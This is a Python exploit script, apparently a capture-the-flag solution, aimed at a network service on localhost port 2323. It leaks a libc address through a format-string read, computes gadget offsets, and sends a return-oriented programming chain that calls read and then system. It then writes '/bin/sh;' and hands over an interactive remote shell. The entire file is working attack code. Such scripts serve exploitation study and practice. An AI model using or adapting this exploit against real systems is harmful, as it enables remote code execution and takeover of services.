from isis import *
pattern = file("/home/blankwall/pattern").read()
debug = True
host = "localhost"
port = 2323

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	#CHECK TO GET INTO GAME
	s.send("NowIsTheWinterOfOurDiscountTent\n")
	return s


def leak(s):#NO NULL TERMINATION ON BUFFER LEAKS OUT LIBC
	s.send("%x"*12)
	recv_until(s,"%x%x%x%x%x%x%x%x")
	x = s.recv(0x500)
	fini = hex(ulei64(x)[0])
	fini = "0x"+fini[5:]
	return int(fini,16) - 0x38fc70

def rdi(base):# POP RDI JMP RAX
	pop = base +0x0000000000083fe8 
	return lei64(pop)

def rsi_rdx(base): #POP RDX RSI RET
	pop = base + 0x108ff9	
	return lei64(pop)

def rax(base): #POP RAX RET
	pop =  base + 0x00000000000193b8
	return lei64(pop)


def rop(base,system): 
	pattern = "A" * 157 # GARBAGE 
	pattern += rsi_rdx(base) #64 BIT FAST CALL SETUP CALL TO READ
	pattern += lei64(0x8) # SIZE INTO RDX
	pattern += lei64(0x601038) #BUFFER INTO RSI
	pattern += rax(base) #RETURN INTO RAX 
	pattern += lei64(0x400690) #VALUE FOR RAX
	pattern += rdi(base) #FD INTO RDI RETURNING INTO RAX
	pattern += lei64(0x0) 
	pattern += rax(base) #FILLING RAX WITH SYSTEM
	pattern += lei64(system) 
	pattern += rdi(base) #PUTTING SYSTEM ARGUMENT INTO RDI
	pattern += lei64(0x601038)
	pattern += lei64(0xcafebabe) #GARBAGE RETURN
	return pattern

s = connect()
if debug:
	raw_input("?")

system = leak(s)
base = system - 0x468f0
print "BASE: " + hex(base)
pattern = rop(base,system)
s.send("%2000x"*150 + pattern + "\n")
time.sleep(0.5)
s.send("/bin/sh;" + "\n")
telnet_shell(s)
